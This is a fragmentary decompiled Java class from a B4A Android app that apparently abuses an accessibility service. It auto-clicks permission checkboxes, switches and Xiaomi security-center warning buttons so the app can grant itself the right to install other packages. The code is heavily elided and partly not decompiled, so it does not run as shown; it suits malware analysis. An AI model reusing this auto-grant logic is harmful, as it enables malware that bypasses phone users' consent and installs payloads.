...
public class cls_perm_oheraps extends B4AClass.ImplB4AClass implements BA.SubDelegator {
    ...
    private void innerInitialize(BA BA) throws Exception {
        if (this.f268ba == null) {
            this.f268ba = new BA(BA, this, htSubs, "com.com.androidrr.cls_perm_oheraps");
            if (htSubs == null) {
        ...
        if (BA.isShellModeRuntimeCheck(this.f268ba)) {
            getClass().getMethod("_class_globals", cls_perm_oheraps.class).invoke(this, null);
        } else {
    ...
    public boolean _candrawoverlays() throws Exception {
        try {
            ...
            Common.LogImpl("613828110", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }
    ...
    public boolean _canrequestpackageinstalls() throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("613959176", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }
    ...
    public boolean _check_if_notis() throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("613762572", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }
    ...
    public String _click_one_checkbox(List list) throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("613565965", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        ...
        for (int i = 0; i < size; i++) {
            ...
            if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("checkbox".toLowerCase())) {
                ...
                Common.LogImpl("613565959", "Clicked Choeckbox", -256);
                _returner_to_act();
                return "";
            }
        }
    ...
    public String _click_one_switch(List list) throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("613500428", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_canrequestpackageinstalls()) {
            return "";
        }
    ...
    /* JADX WARN: Code restructure failed: missing block: B:12:0x002a, code lost:
        ...
        if (com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.AccessibilityEventsListener.findAndGetFirstSimilar(r28, "android:id/list", true) != null) goto L12;
     */
    /*
    ...
    */
    public java.lang.String _in_case_its_a_list(anywheresoftware.b4a.objects.collections.List r27, java.lang.Object r28) throws java.lang.Exception {
        ...
        */
        throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.cls_perm_oheraps._in_case_its_a_list(anywheresoftware.b4a.objects.collections.List, java.lang.Object):java.lang.String");
    }
    ...
    public boolean _in_case_system_button1_showing(List list) throws Exception {
        ...
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("613697039", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_canrequestpackageinstalls()) {
            return true;
        }
    ...
    public String _incase_device_xiaomi_perm(String str, String str2, List list, Object obj) throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("614024748", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_canrequestpackageinstalls()) {
            return "";
        }
                ...
                if (!BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("com.miui.securitycenter:id/check_box")) {
                    ...
                    for (int i2 = 0; i2 < size2; i2++) {
                        ...
                        if (BA.ObjectToString(map11.Get("viewid")).toLowerCase().contains("com.miui.securitycenter:id/intercept_warn_allow")) {
                            Colors colors = Common.Colors;
                            Common.LogImpl("614024718", "clicking by id left top", -16711936);
    ...
    public boolean _is_perm_requested() throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("614417931", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return true;
        }
    }
    ...
    public static class ResumableSub_PerformAction extends BA.ResumableSub {
        cls_perm_oheraps parent;

        public ResumableSub_PerformAction(cls_perm_oheraps cls_perm_oherapsVar) {
            this.parent = cls_perm_oherapsVar;
        }
        ...
        */
        public void resume(anywheresoftware.b4a.BA r7, java.lang.Object[] r8) throws java.lang.Exception {
            ...
            Le:
                ...
                com.com.androidrr.cls_perm_oheraps r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r8 = r8.__c     // Catch: java.lang.Exception -> L9f
                java.lang.String r8 = "614155779"
                java.lang.String r0 = "PerformAction"
                com.com.androidrr.cls_perm_oheraps r1 = r6.parent     // Catch: java.lang.Exception -> L9f
            ...
            L2b:
                ...
                com.com.androidrr.cls_perm_oheraps r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r8 = r8.__c     // Catch: java.lang.Exception -> L9f
                java.lang.String r8 = "614155786"
                com.com.androidrr.cls_perm_oheraps r0 = r6.parent     // Catch: java.lang.Exception -> L9f
            ...
            L6b:
                r6.state = r1     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_oheraps r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                boolean r8 = r8._canrequestpackageinstalls()     // Catch: java.lang.Exception -> L9f
                if (r8 == 0) goto L0
                r8 = 6
                r6.state = r8     // Catch: java.lang.Exception -> L9f
                goto L0
            ...
            Laf:
                goto Lae
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.cls_perm_oheraps.ResumableSub_PerformAction.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }
    ...
    public static class ResumableSub_Real_Checker extends BA.ResumableSub {
        ...
        public ResumableSub_Real_Checker(cls_perm_oheraps cls_perm_oherapsVar, String str, String str2, List list, Object obj) {
            this.parent = cls_perm_oherapsVar;
            this._strpkg = str;
            this._strevt = str2;
                ...
                try {
                    switch (this.state) {
                        ...
                        case 3:
                            ...
                            Colors colors = Common.Colors;
                            Common.LogImpl("613369346", "Other Apps ----> Real_Checker ", -65536);
                            break;
                        case 4:
                            this.state = 7;
                        ...
                        case 7:
                            ...
                            Common.LogImpl("613369355", "int_Number_Of_Switches : " + BA.NumberToString(this._int_number_of_switches), 0);
                        ...
                        case 14:
                            ...
                            Common.LogImpl("613369367", "int_Number_Of_Checkboxes : " + BA.NumberToString(this._int_number_of_checkboxes), 0);
                            break;
                        case 15:
                            this.state = 18;
                        ...
                        case 23:
                            this.state = 28;
                            boolean _canrequestpackageinstalls2 = this.parent._canrequestpackageinstalls();
                            Common common13 = this.parent.__c;
                            if (_canrequestpackageinstalls2) {
                                this.state = 25;
                                break;
                            } else {
                                this.state = 27;
                        ...
                        case 25:
                            ...
                            cls_perm_oheraps cls_perm_oherapsVar = this.parent;
                            Common common15 = cls_perm_oherapsVar.__c;
                            cls_perm_oherapsVar._isclassfinished = true;
                            break;
                        case 27:
                            this.state = 28;
                        ...
                        case 30:
                            ...
                            Common.LogImpl("613369399", BA.ObjectToString(Common.LastException(this.parent.getActivityBA())), 0);
                            break;
    ...
    public String _request_perm() throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("614483463", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }
    ...
    public String _returner_to_act() throws Exception {
        try {
            Common.LogImpl("614352386", BA.ObjectToString(Boolean.valueOf(_canrequestpackageinstalls())), 0);
            Colors colors = Common.Colors;
            Common.LogImpl("614352388", "returner_To_Act0000", -16776961);
            if (!_canrequestpackageinstalls()) {
                return "";
            }
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("614352410", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }
    ...
    public String _search_click_in_multiple_switches(List list) throws Exception {
        ...
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("613631546", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }
    ...
    public String _timer_creator() throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("614221319", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }
    ...
    public String _timerchecker_tick() throws Exception {
        try {
            Colors colors = Common.Colors;
            Common.LogImpl("614286850", "Cls_Perm_OherAps timerChecker_Tick", -65536);
            new dateutils._period();
            BA activityBA = getActivityBA();
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("614286866", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        return "";
    }
